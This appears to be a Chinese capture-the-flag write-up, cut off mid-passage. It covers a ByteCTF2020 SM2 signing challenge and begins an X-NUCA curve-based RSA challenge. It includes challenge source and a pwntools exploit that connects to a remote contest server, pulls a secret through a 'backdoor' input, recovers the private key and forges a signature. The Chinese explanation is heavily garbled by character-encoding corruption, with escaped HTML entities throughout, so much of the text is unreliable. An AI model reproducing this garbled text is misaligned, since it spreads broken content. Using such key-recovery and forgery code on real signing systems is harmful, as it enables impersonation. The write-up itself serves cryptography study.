\u0026#39;bc3736a2f4f6779c59bdcee36b692153d0a9877cc62a474002df32e52139f0a0\u0026#39;, \u0026#39;a\u0026#39;: \u0026#39;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFC\u0026#39;, \u0026#39;b\u0026#39;: \u0026#39;28E9FA9E9D9F5E344D5A9E4BCF6509A7F39789F515AB8F92DDBCBD414D940E93\u0026#39;, } n = \u0026#39;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123\u0026#39; G = \u0026#39;32c4ae2c1f1981195f9904466a39c9948fe30bbff2660be1715a4589334c74c7\u0026#39; \\ \u0026#39;bc3736a2f4f6779c59bdcee36b692153d0a9877cc62a474002df32e52139f0a0\u0026#39; def sign(tsm2): data = func.random_hex(len(n)) k1_str = func.random_hex(len(n)) print(tsm2.send_p1(data, k1_str)) backdoor = input(\u0026#39;backdoor:\u0026#39;).strip() result = tsm2.output_p1(k1_str, backdoor) print(result) def verify(tsm2): message = input(\u0026#39;msg:\u0026#39;).strip().encode().strip(b\u0026#39;\\x00\u0026#39;) sign = input(\u0026#39;sign:\u0026#39;).strip().encode().strip(b\u0026#39;\\x00\u0026#39;) check = tsm2.verify(sign, message) if check is True and message == b\u0026#39;Hello, Welcome to ByteCTF2020!\u0026#39;: print(FLAG) else: print(check) class TSM2(object): def __init__(self, sk): ecc_table = sm2p256v1_ecc_table self.ecc_table = ecc_table self.n = int(ecc_table[\u0026#39;n\u0026#39;], 16) self.para_len = len(ecc_table[\u0026#39;n\u0026#39;]) self.ecc_a3 = (int(ecc_table[\u0026#39;a\u0026#39;], base=16) + 3) % int(ecc_table[\u0026#39;p\u0026#39;], base=16) self.sk = int(sk, 16) self.pk = self._kg(self.sk, ecc_table[\u0026#39;g\u0026#39;]) self.sks = int(func.random_hex(self.para_len), 16) self.pks = pow((self.sk + 1) * self.sks, self.n - 2, self.n) % self.n def send_p1(self, data, k1_str): e = int(data, 16) k1 = int(k1_str, 16) k1 = k1 % self.n R1 = self._kg(k1, self.ecc_table[\u0026#39;g\u0026#39;]) return \u0026#39;%064x%0128s\u0026#39; % (e, R1) def output_p1(self, k1_str, r_s2_s3): r = int(r_s2_s3[0:self.para_len], 16) s2 = int(r_s2_s3[self.para_len:2 * self.para_len], 16) s3 = int(r_s2_s3[2 * self.para_len:], 16) k1 = int(k1_str, 16) d1 = self.sksã€ s = (d1 * k1 * s2 + d1 * s3 - r) % self.n if s == 0 or s == (self.n - r): return None return \u0026#39;%064x%064x\u0026#39; % (r, s) def verify(self, Sign, data): r = int(Sign[0:self.para_len], 16) s = int(Sign[self.para_len:2 * self.para_len], 16) e = int(data.hex(), 16) t = (r + s) % self.n if t == 0: return 0 P1 = self._kg(s, self.ecc_table[\u0026#39;g\u0026#39;]) P2 = self._kg(t, self.pk)ã€ if P1 == P2: P1 = \u0026#39;%s%s\u0026#39; % (P1, 1) P1 = self._double_point(P1) else: P1 = \u0026#39;%s%s\u0026#39; % (P1, 1) P1 = self._add_point(P1, P2) P1 = self._convert_jacb_to_nor(P1) x = int(P1[0:self.para_len], 16) return r == ((e + x) % self.n) def _kg(self, k, Point): if (k % self.n) == 0: return \u0026#39;0\u0026#39; * 128 Point = \u0026#39;%s%s\u0026#39; % (Point, \u0026#39;1\u0026#39;) mask_str = \u0026#39;8\u0026#39; for i in range(self.para_len - 1): mask_str += \u0026#39;0\u0026#39; mask = int(mask_str, 16) Temp = Point flag = False for n in range(self.para_len * 4): if flag: Temp = self._double_point(Temp) if (k \u0026amp; mask) != 0: if flag: Temp = self._add_point(Temp, Point) else: flag = True Temp = Point k = k \u0026lt;\u0026lt; 1 return self._convert_jacb_to_nor(Temp) def _double_point(self, Point): l = len(Point) len_2 = 2 * self.para_len if l \u0026lt; self.para_len * 2: return None else: x1 = int(Point[0:self.para_len], 16) y1 = int(Point[self.para_len:len_2], 16) if l == len_2: z1 = 1 else: z1 = int(Point[len_2:], 16) T6 = (z1 * z1) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T2 = (y1 * y1) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T3 = (x1 + T6) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T4 = (x1 - T6) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T1 = (T3 * T4) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T3 = (y1 * z1) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T4 = (T2 * 8) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T5 = (x1 * T4) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T1 = (T1 * 3) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T6 = (T6 * T6) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T6 = (self.ecc_a3 * T6) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T1 = (T1 + T6) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) z3 = (T3 + T3) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T3 = (T1 * T1) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T2 = (T2 * T4) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) x3 = (T3 - T5) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) if (T5 % 2) == 1: T4 = (T5 + ((T5 + int(self.ecc_table[\u0026#39;p\u0026#39;], base=16)) \u0026gt;\u0026gt; 1) - T3) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) else: T4 = (T5 + (T5 \u0026gt;\u0026gt; 1) - T3) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T1 = (T1 * T4) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) y3 = (T1 - T2) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) form = \u0026#39;%%0%dx\u0026#39; % self.para_len form = form * 3 return form % (x3, y3, z3) def _add_point(self, P1, P2): if P1 == \u0026#39;0\u0026#39; * 128: return \u0026#39;%s%s\u0026#39; % (P2, \u0026#39;1\u0026#39;) if P2 == \u0026#39;0\u0026#39; * 128: return \u0026#39;%s%s\u0026#39; % (P1, \u0026#39;1\u0026#39;) len_2 = 2 * self.para_len l1 = len(P1) l2 = len(P2) if (l1 \u0026lt; len_2) or (l2 \u0026lt; len_2): return None else: X1 = int(P1[0:self.para_len], 16) Y1 = int(P1[self.para_len:len_2], 16) if l1 == len_2: Z1 = 1 else: Z1 = int(P1[len_2:], 16) x2 = int(P2[0:self.para_len], 16) y2 = int(P2[self.para_len:len_2], 16) T1 = (Z1 * Z1) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T2 = (y2 * Z1) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T3 = (x2 * T1) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T1 = (T1 * T2) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T2 = (T3 - X1) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T3 = (T3 + X1) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T4 = (T2 * T2) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T1 = (T1 - Y1) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) Z3 = (Z1 * T2) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T2 = (T2 * T4) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T3 = (T3 * T4) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T5 = (T1 * T1) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T4 = (X1 * T4) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) X3 = (T5 - T3) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T2 = (Y1 * T2) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T3 = (T4 - X3) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) T1 = (T1 * T3) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) Y3 = (T1 - T2) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) form = \u0026#39;%%0%dx\u0026#39; % self.para_len form = form * 3 return form % (X3, Y3, Z3) def _convert_jacb_to_nor(self, Point): len_2 = 2 * self.para_len x = int(Point[0:self.para_len], 16) y = int(Point[self.para_len:len_2], 16) z = int(Point[len_2:], 16) z_inv = pow(z, int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) - 2, int(self.ecc_table[\u0026#39;p\u0026#39;], base=16)) z_invSquar = (z_inv * z_inv) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) z_invQube = (z_invSquar * z_inv) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) x_new = (x * z_invSquar) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) y_new = (y * z_invQube) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) z_new = (z * z_inv) % int(self.ecc_table[\u0026#39;p\u0026#39;], base=16) if z_new == 1: form = \u0026#39;%%0%dx\u0026#39; % self.para_len form = form * 2 return form % (x_new, y_new) else: return None if __name__ == \u0026#39;__main__\u0026#39;: sk = func.random_hex(len(sm2p256v1_ecc_table[\u0026#39;n\u0026#39;])) tsm2 = TSM2(sk) print(\u0026#39;pk:%s\u0026#39; %tsm2.pk) print(\u0026#39;pks:%064x\u0026#39;%tsm2.pks) for i in range(10): op = input(\u0026#39;op: \u0026#39;).strip() if op == \u0026#39;sign\u0026#39;: sign(tsm2) elif op == \u0026#39;verify\u0026#39;: verify(tsm2) else: print(\u0026#34;\u0026#34;\u0026#34;sign: sign message verify: verify message\u0026#34;\u0026#34;\u0026#34;) å•Šï¼Œè¿™ç¬¬äºŒé¢˜ç”»é£å°±çªå˜ï¼Œå¥½é•¿çš„ä»£ç ï¼Œè®©äººå¤±å»æ¬²æœ›ã€‚ä½†å…¶å®å‘¢ï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯å¯¹sm2çš„ä¸€ä¸ªå®ç°ï¼Œå…¶å®ä¸ç”¨ç»†ç©¶ã€‚è¿™é‡Œæˆ‘ä»¬å°±ç›´æ¥å…ˆæå–å…³é”®éƒ¨åˆ†ï¼Œä¸€æ­¥ä¸€æ­¥æ¥å•¦ã€‚\né¦–å…ˆæœ€ä¸Šé¢çš„\ndef sign(tsm2): data = func.random_hex(len(n)) k1_str = func.random_hex(len(n)) print(tsm2.send_p1(data, k1_str)) backdoor = input(\u0026#39;backdoor:\u0026#39;).strip() result = tsm2.output_p1(k1_str, backdoor) print(result) def verify(tsm2): message = input(\u0026#39;msg:\u0026#39;).strip().encode().strip(b\u0026#39;\\x00\u0026#39;) sign = input(\u0026#39;sign:\u0026#39;).strip().encode().strip(b\u0026#39;\\x00\u0026#39;) check = tsm2.verify(sign, message) if check is True and message == b\u0026#39;Hello, Welcome to ByteCTF2020!\u0026#39;: print(FLAG) else: print(check) ä¿©åŠŸèƒ½ï¼Œä¸€ä¸ªæ˜¯æ³¨å†Œï¼Œä¸€ä¸ªæ˜¯éªŒè¯ï¼Œè·å–flagçš„åœ°æ–¹å°±æ˜¯è¿™ä¸ªéªŒè¯ï¼Œä»–è¦æ±‚ä½ å¯¹messageè¿›è¡Œä¸€ä¸ªç­¾åï¼Œè€Œmessageè¦æ±‚æ˜¯bâ€™Hello, Welcome to ByteCTF2020!â€™\nå¥½çš„ï¼Œé‚£æˆ‘ä»¬çœ‹çœ‹å’‹æ ·æ‰èƒ½ç»™è¿™ä¸ªmessageç­¾ä¸Šåï¼Œå»æ‰¾æ‰¾ç­¾åçš„éªŒè¯å‡½æ•°ã€‚\ndef verify(self, Sign, data): r = int(Sign[0:self.para_len], 16) s = int(Sign[self.para_len:2 * self.para_len], 16) e = int(data.hex(), 16) t = (r + s) % self.n if t == 0: return 0 P1 = self._kg(s, self.ecc_table[\u0026#39;g\u0026#39;]) P2 = self._kg(t, self.pk) if P1 == P2: P1 = \u0026#39;%s%s\u0026#39; % (P1, 1) P1 = self._double_point(P1) else: P1 = \u0026#39;%s%s\u0026#39; % (P1, 1) P1 = self._add_point(P1, P2) P1 = self._convert_jacb_to_nor(P1) x = int(P1[0:self.para_len], 16) return r == ((e + x) % self.n) è¿™ä¸ªéªŒè¯å‡½æ•°æœ‰ä¸‰ä¸ªè¾“å…¥ï¼šrï¼Œsï¼Œeï¼Œç„¶åè¿™é‡Œæœ‰ä¸€ä¸ªself._kg ï¼Œè¿™ä¸ªå…¶å®å°±æ˜¯ä¸€ä¸ªæ¤­åœ†æ›²çº¿ä¸Šçš„ä¸€ä¸ªä¹˜æ³•ï¼Œæ‰€ä»¥P1 = s * gï¼Œgæ˜¯æ¤­åœ†æ›²çº¿ä¸Šçš„ä¸€ä¸ªåŸºç‚¹ï¼ŒP2 = t * pk ï¼Œä»£ç å‰å¤´æœ‰å¯¹pkçš„å®šä¹‰ self.pk = self._kg(self.sk, ecc_table['g']),æ‰€ä»¥å°±æ˜¯P2 = ((r+s)%n) * sk * gï¼Œæ¥ä¸‹æ¥çš„æ“ä½œä¸éš¾çœ‹å‡ºï¼Œè¿™é‡Œå°±æ˜¯ä¸¤ä¸ªç‚¹ç›¸åŠ ï¼Œè¿™é‡Œå¯ä»¥printå‡ºæ¥çœ‹ä¸€ä¸‹è¾“å‡ºï¼Œæ˜¯ä¸€ä¸ªç‚¹çš„åæ ‡çš„åå…­è¿›åˆ¶è¡¨ç¤ºçš„å­—ç¬¦ä¸²çš„æ‹¼æ¥ï¼Œxå°±æ˜¯è¿™ä¸ªç‚¹çš„xåæ ‡ã€‚æœ€åæ˜¯ä¸€ä¸ªåˆ¤æ–­ r == ((e + x) % self.n)\né¦–å…ˆeæ˜¯å›ºå®šçš„ bâ€™Hello, Welcome to ByteCTF2020!â€™ã€‚æˆ‘ä»¬èƒ½æ“ä½œçš„å°±æ˜¯rå’Œsäº†ï¼Œxæ˜¯ä¸€ä¸ªç®—å‡ºæ¥çš„åæ ‡ï¼Œä¸ºäº†è®©è¿™ä¸ªåˆ¤æ–­æˆç«‹ï¼Œæˆ‘ä»¬å°±éœ€è¦æ„é€ æˆ‘ä»¬çš„è¾“å…¥rï¼Œä¸ºäº†æ„é€ rå¾—æå‰ç®—å‡ºP1çš„xåæ ‡ï¼Œè€ŒP1=P1+P2 = s * g + ((r + s)%n) * sk * gã€‚ä¹ä¸€çœ‹æˆ‘ä»¬å¥½åƒé™·å…¥äº†æ­»é”ã€‚è¿™é‡Œå¤´æ€ä¹ˆåˆå‡ºç°äº†rï¼Ÿ\næ¢ä¸ªæ€è·¯æƒ³æƒ³ï¼Œè™½ç„¶è¿™é‡Œçš„P1æ˜¯åæ¥æ ¹æ®æˆ‘ä»¬çš„è¾“å…¥ç®—å‡ºæ¥çš„ï¼Œä½†å…¶å®æˆ‘ä»¬ä¹Ÿå¯ä»¥å…ˆå›ºå®šè¿™ä¸ªP1ã€‚æœ€åå†ç²¾å¿ƒæ„é€ ä¸€ä¸‹è¾“å…¥ï¼Œè®©ä»–æ­£å¥½ç®—å‡ºæ¥æ˜¯è¿™ä¸ªP1ï¼Œ\næ‰€ä»¥å‡è®¾æˆ‘ä»¬å·²ç»çŸ¥é“æœ€åçš„ç‚¹P1äº†ï¼Œå°±å½“ä»–æ˜¯2gå¥½äº†ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç®—å‡ºxäº†ï¼Œæœ‰äº†xï¼Œé‚£ä¹ˆrä¹Ÿå°±å›ºå®šä¸‹æ¥äº†ï¼Œé‚£æˆ‘ä»¬å°±å°±åªéœ€è¦æ„é€ sè®©å®ƒç®—å‡ºè¿™ä¸ªP1ç‚¹äº†ã€‚\næˆ‘ä»¬çŸ¥é“ï¼Œè™½ç„¶æ¤­åœ†æ›²çº¿çš„åŠ æ³•å’Œä¹˜æ³•ä¸åŒäºæ™®é€šçš„å››åˆ™è¿ç®—ï¼Œä½†æ˜¯ä¸€äº›è¿ç®—æ³•åˆ™è¿˜æ˜¯é€‚ç”¨çš„ï¼Œæ¯”å¦‚åˆ†é…å¾‹ã€äº¤æ¢å¾‹è¿™äº›ï¼Œæ‰€ä»¥å¼å­ï¼šP1=P1+P2 = s * g + ((r + s)%n) * sk * g å¯ä»¥åšä¸€äº›å˜å½¢ï¼Œæˆ‘ä»¬å·²ç»çŸ¥é“P1=2gäº†ï¼Œå¤–åŠ è¿™æ¡æ›²çº¿çš„é˜¶æ˜¯nï¼ˆæˆ‘æ‰¿è®¤æˆ‘æœ‰èµŒçš„æˆåˆ†ï¼‰ï¼Œæ‰€ä»¥æœ‰\n$2*g \\equiv s * g + (r + s) * sk * g \\pmod n$\n$2 \\equiv s + (r+s)* sk \\pmod n$\n$2 \\equiv s*(sk+1) + r *sk \\pmod n$\n$s \\equiv (2 -r*sk) *( sk+1)^{-1} \\pmod n$\nå…¶ä¸­rç¡®å®šäº†ï¼Œnç¡®å®šäº†ï¼Œåªå‰©skäº†ï¼Œè€Œskå…¶å®ä¹Ÿå°±æ˜¯ç›¸å½“äºè¿™æ¡æ¤­åœ†æ›²çº¿çš„ç§é’¥\nè¿™æ˜¯æˆ‘ä»¬å¾—å›è¿‡å¤´æ¥çœ‹æœ€åˆçš„signå‡½æ•°äº†\ndef sign(tsm2): data = func.random_hex(len(n)) k1_str = func.random_hex(len(n)) print(tsm2.send_p1(data, k1_str)) backdoor = input(\u0026#39;backdoor:\u0026#39;).strip() result = tsm2.output_p1(k1_str, backdoor) print(result) ä¸èƒ½å†æ˜æ˜¾äº†ï¼Œbackdooréƒ½å†™ç»™ä½ äº†ï¼Œæ˜¾ç„¶æ˜¯è¦åˆ©ç”¨è¿™é‡Œæ¥æ•´åˆ°skï¼Œ\ndataå’Œk1_stréƒ½æ˜¯ä¸å¯æ§çš„éšæœºæ•°ï¼Œ\nç„¶åprintäº†send_p1å‡½æ•°çš„è¾“å‡ºï¼Œ\ndef send_p1(self, data, k1_str): e = int(data, 16) k1 = int(k1_str, 16) k1 = k1 % self.n R1 = self._kg(k1, self.ecc_table[\u0026#39;g\u0026#39;]) return \u0026#39;%064x%0128s\u0026#39; % (e, R1) ç»™çš„æ˜¯dataå’Œä¸€ä¸ªR1ï¼ŒR1æ˜¯k1 * gï¼Œæ˜¯ä¸€ä¸ªæ›²çº¿ä¸Šçš„ç‚¹ï¼Œå¥½åƒæ²¡å•¥ç”¨å•Šï¼Œç»§ç»­çœ‹\næ‹¿åˆ°æˆ‘ä»¬çš„è¾“å…¥åï¼Œç¨‹åºæŠŠk1_strå’Œæˆ‘ä»¬çš„è¾“å…¥ä¼ ç»™äº†output_p1å¹¶ç»™äº†è¾“å‡º\ndef output_p1(self, k1_str, r_s2_s3): r = int(r_s2_s3[0:self.para_len], 16) s2 = int(r_s2_s3[self.para_len:2 * self.para_len], 16) s3 = int(r_s2_s3[2 * self.para_len:], 16) k1 = int(k1_str, 16) d1 = self.sks s = (d1 * k1 * s2 + d1 * s3 - r) % self.n if s == 0 or s == (self.n - r): return None return \u0026#39;%064x%064x\u0026#39; % (r, s) ç»™çš„æ˜¯rå’Œsï¼Œåªè¦sä¸ç­‰äº0ï¼Œs+rä¸ç­‰äºnï¼Œ\nå…¶ä¸­æˆ‘ä»¬çš„è¾“å…¥åº”è¯¥æ˜¯96å­—èŠ‚çš„ï¼Œåˆ†ä¸ºä¸‰æ®µï¼Œä»£è¡¨rï¼Œs2ï¼Œs3ï¼Œ\nk1æ˜¯å°±æ˜¯k1_strçš„æ•´å‹ï¼Œç¨‹åºä¹‹å‰ç”Ÿæˆçš„ï¼Œd1æ˜¯self.sksï¼Œè¿™åœ¨ä»£ç é‡Œå¤´æ˜¯self.sks = int(func.random_hex(self.para_len), 16)ä¹Ÿæ˜¯ä¸€ä¸ªéšæœºæ•°ï¼Œä½†æ˜¯å®ƒå’Œskè·Ÿpksæœ‰ç‚¹å…³ç³»ï¼šself.pks = pow((self.sk + 1) * self.sks, self.n - 2, self.n) % self.n\nä¹‹æ‰€ä»¥æ‰¯åˆ°pksï¼Œå› ä¸ºç¨‹åºä¸€è¿›å»ä»–å°±æŠŠè¿™ä¸ªå€¼ç»™æˆ‘ä»¬äº†å•Š\nif __name__ == \u0026#39;__main__\u0026#39;: sk = func.random_hex(len(sm2p256v1_ecc_table[\u0026#39;n\u0026#39;])) tsm2 = TSM2(sk) print(\u0026#39;pk:%s\u0026#39; %tsm2.pk) print(\u0026#39;pks:%064x\u0026#39;%tsm2.pks) æ ¹æ®pksçš„ç”Ÿæˆå¼å­ï¼Œå…¶ä¸­é™¤äº†skå’Œsksæˆ‘ä»¬éƒ½çŸ¥é“ï¼Œ\næ‰€ä»¥æˆ‘ä»¬åº”è¯¥å°±æ˜¯è¦åˆ©ç”¨è¿™ä¸ªpksï¼Œsksæ¥æ¢å¤è¿™ä¸ªskï¼Œä½†æ˜¯æ€ä¹ˆè·å¾—è¿™ä¸ªsks ä¹Ÿå³ d1 å‘¢ï¼Œ\ns = (d1 * k1 * s2 + d1 * s3 - r) % self.n è®©s2=0ï¼Œs3=1ï¼Œr=0ï¼Œè¿™æ ·å°±èƒ½å¾—åˆ° s = d1 % näº†\næ˜¾ç„¶d1 \u0026lt; n ï¼Œæ•…s = d1ï¼Œå¹¶ä¸” d1 + r != nï¼Œæ•…èƒ½è¿”å›ã€‚\né‚£ä¹ˆè‡³æ­¤ï¼Œåˆ©ç”¨é“¾å°±å…¨äº†ã€‚\nè§£é¢˜æµç¨‹ # æ‰€ä»¥è¿™é“é¢˜çš„æ•´ä¸ªè§£é¢˜æµç¨‹ï¼š\næ„é€ backdoor = 191 * â€˜0â€™ + â€˜1â€™ æ¥è·å–sksï¼Œ åˆ©ç”¨pksæ¥è·å–skï¼Œ éšä¾¿åœ¨æ›²çº¿ä¸Šå–ä¸€ä¸ªç‚¹ï¼Œè®¡ç®—xï¼Œæ ¹æ®eæ¥å›ºå®šr è®¡ç®—$s \\equiv (2 -r*sk) *( sk+1)^{-1} \\pmod n$ ä¼ å…¥rï¼Œsï¼Œeï¼Œè·å–flag exp\nfrom gmssl import func, sm2 from Crypto.Util.number import * from TSM2 import * sk = func.random_hex(len(sm2p256v1_ecc_table[\u0026#39;n\u0026#39;])) tsm2 = TSM2(sk) from pwn import * context.log_level = \u0026#39;debug\u0026#39; sh=remote(\u0026#34;182.92.215.134\u0026#34;,\u0026#34;30103\u0026#34;) sh.recvuntil(\u0026#34;pk:\u0026#34;) pk =int(sh.recvuntil(\u0026#34;\\n\u0026#34;)[:-1],16) sh.recvuntil(\u0026#34;pks:\u0026#34;) pks=int(sh.recvuntil(\u0026#34;\\n\u0026#34;)[:-1],16) tsm2.pks=pks sh.recvuntil(\u0026#34;op:\u0026#34;) sh.sendline(\u0026#34;sign\u0026#34;) sh.recvuntil(\u0026#34;backdoor:\u0026#34;) sh.sendline(\u0026#34;0\u0026#34;*191+\u0026#34;1\u0026#34;) sks = int(sh.recvuntil(\u0026#34;\\n\u0026#34;)[:-1],16) tsm2.sks=sks tmp = inverse(tsm2.pks,tsm2.n) tsm2.sk=tmp*inverse(tsm2.sks,tsm2.n)%tsm2.n-1 tsm2.pk = tsm2._kg(tsm2.sk, tsm2.ecc_table[\u0026#39;g\u0026#39;]) assert int(tsm2.pk,16)==pk print(tsm2.sk) sh.recvuntil(\u0026#34;op:\u0026#34;) sh.sendline(\u0026#34;verify\u0026#34;) e=bytes_to_long(b\u0026#39;Hello, Welcome to ByteCTF2020!\u0026#39;) b = 2 B = tsm2._kg(b, tsm2.ecc_table[\u0026#39;g\u0026#39;]) x = int(B[0:tsm2.para_len], 16) r = ((e + x) % tsm2.n) #b = s + (s+r)*sk #b = s*(1+sk) + r*sk #b - r*sk n=0xFFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123 print(tsm2.sk,) s = (b - r*tsm2.sk)*inverse(1+tsm2.sk,n)%n sign = \u0026#39;%064x%064x\u0026#39; % (r, s) print(sign) sh.recvuntil(\u0026#34;msg:\u0026#34;) sh.sendline(\u0026#34;Hello, Welcome to ByteCTF2020!\u0026#34;) sh.recvuntil(\u0026#34;sign:\u0026#34;) sh.sendline(sign) sh.interactive() X-NUCA # weird # éœ€è¦å‰ç½®çŸ¥è¯†æˆ–äº†è§£ï¼šå¥‡å¼‚çˆ±å¾·åæ›²çº¿\nå¯å‚è€ƒèµ„æ–™ï¼šhttps://learnblockchain.cn/article/1627\n#!/usr/bin/env sage from secret import FLAG assert FLAG.startswith(b\u0026#34;X-NUCA{\u0026#34;) and FLAG.endswith(b\u0026#34;}\u0026#34;) def key_gen(bits): while True: p = random_prime(2**bits) q = random_prime(2**bits) if p % 4 == 3 and q % 4 == 3: break if p \u0026lt; q: p, q = q, p N = p * q while True: x = getrandbits(bits // 2) y = getrandbits(bits // 2) if gcd(x, y) == 1 and (x * y) \u0026lt; (int(sqrt(2 * N)) // 12): e = randint( int(((p + 1) * (q + 1) * 3 * (p + q) - (p - q) * int(N**0.21)) * y / (x * 3 * (p + q))), int(((p + 1) * (q + 1) * 3 * (p + q) + (p - q) * int(N**0.21)) * y / (x * 3 * (p + q))) ) if gcd(e, (p + 1) * (q + 1)) == 1: k = inverse_mod(e, (p + 1) * (q + 1)) break return (N, e, k) if __name__ == \u0026#34;__main__\u0026#34;: bits = 1024 N, e, _ = key_gen(bits) pt = (int.from_bytes(FLAG[:32], \u0026#39;big\u0026#39;), int.from_bytes(FLAG[32:], \u0026#39;big\u0026#39;)) ct = (0, 1) d = (((pt[1])**2 - 1) * inverse_mod(((pt[1])**2 + 1) * (pt[0])**2, N)) % N # 2000 years later...:) for _ in range(e): ct = ( int((ct[0] * pt[1] + ct[1] * pt[0]) * inverse_mod(1 + d * ct[0] * pt[0] * ct[1] * pt[1], N) % N), int((ct[1] * pt[1] + d * ct[0] * pt[0]) * inverse_mod(1 - d * ct[0] * pt[0] * ct[1] * pt[1], N) % N) ) f = open(\u0026#34;output.txt\u0026#34;, \u0026#34;wb\u0026#34;) f.write(str((e, N)).encode() + b\u0026#39;\\n\u0026#39;) f.write(str(ct).encode()) f.close() å¥½çš„ï¼Œç¬¬ä¸€é¢˜ä»£ç é‡ä¸å¤šï¼Œä¸é”™ä¸é”™ï¼ˆå—¯ï¼Ÿä¼¼æ›¾ç›¸è¯†ï¼Œå±ã€‚ã€‚ï¼‰é¦–å…ˆçœ‹çœ‹ä»–çš„åŠŸèƒ½ï¼ŒåŠ å¯†æ–¹å¼æ˜¯æŠŠflagæ‹†æˆäº†å·¦å³ä¸¤ä»½ï¼Œç»„æˆä¸€ä¸ªæ•°å¯¹ï¼Œç„¶ååšäº†eæ¬¡çš„æ“ä½œï¼Œå¾—åˆ°ä¸€ä¸ªctæ•°å¯¹ã€‚è¿™é‡Œçš„eæ¬¡æ“ä½œå…¶å®å°±æ˜¯ä¸€ä¸ªå¥‡å¼‚çˆ±å¾·åæ›²çº¿çš„ä¸€ä¸ªä¹˜æ³•æ“ä½œã€‚ï¼ˆé¢˜ç›®åä¸å°±æ˜¯weirdä¹ˆï¼Ÿï¼‰æ‰€ä»¥æœ‰äº†eä½œä¸ºåŠ å¯†çš„å…¬é’¥ï¼Œæˆ‘ä»¬è‡ªç„¶å°±è¦æ‰¾ç§é’¥dï¼Œè€Œç§é’¥dï¼Œï¼ˆæˆ‘æ‰¿è®¤æˆ‘æœ‰èµŒçš„æˆåˆ†ï¼‰d=inverse(e,(p+1) * (q+1))ï¼Œï¼ˆæ›¾ç»åœ¨ä¸€ç¯‡paperé‡Œçœ‹åˆ°è¿‡ä¸€çœ¼ï¼Œè™½ç„¶ç”¨çš„å¹¶éå¥‡å¼‚çˆ±å¾·åæ›²çº¿ï¼‰\nimage-20201102183336623\nå…¶ä¸­pï¼Œqæ˜¯å¤§æ•°Nçš„ä¸€ä¸ªåˆ†è§£ã€‚è¿™é‡Œé˜¶çš„ç¡®å®šä¸æ˜¯å¾ˆä¸¥æ ¼ï¼Œä½†å…ˆè¯•è¯•å•¦ã€‚é‚£ä¹ˆè¦è¿™ä¹ˆè¯•çš„è¯å°±è¦åˆ†è§£Nï¼Œé‚£å°±è¦çœ‹åˆ°è¿™ä¸ªkeygençš„è¿‡ç¨‹äº†ï¼Œè¿™é‡Œpï¼Œqçš„ç”Ÿæˆæœ‰ä¸€ç‚¹ç‚¹å°è¦æ±‚ï¼Œç„¶åå°±æ˜¯è¿™ä¸ªeçš„ç”Ÿæˆï¼Œä¸ºäº†ç”Ÿæˆè¿™ä¸ªeï¼Œè¿˜ç‰¹æ„æ•´äº†ä¸ªxï¼Œyã€‚æœ€åè¦æ±‚gcd(e, (p+1) * (q+1))ï¼Œå”‰ï¼Œè¿™ï¼Œæ„Ÿè§‰æˆ‘çš„çŒœæµ‹æ˜¯å¯¹çš„å¥½å­ã€‚åˆ°äº†è¿™é‡Œï¼Œï¼Œè¿™è¿˜ä¸åƒè¥¿æ¹–è®ºå‰‘çš„é‚£ä¸€é“é¢˜å˜›\rWake me until May endsã€‚è¿™é“é¢˜ç›¸å…³çš„paperæåˆ°\nå¦‚æœeæ»¡è¶³ä¸€å®šçš„æ¡ä»¶ï¼Œ\nimage-20201102184915448\né‚£ä¹ˆxï¼Œyå°±ä¼šåœ¨e/Nçš„è¿åˆ†æ•°ä¸Šï¼Œå¹¶ä¸”é€šè¿‡xå’Œyå¯ä»¥è·å¾—Tï¼šp+qçš„ä¸€ä¸ªè¿‘ä¼¼ã€‚\nimage-20201102184201011\né‚£ä¹ˆå›åˆ°è¿™é“é¢˜æœ¬èº«ï¼Œeçš„å–å€¼\ne = randint( int(((p + 1) * (q 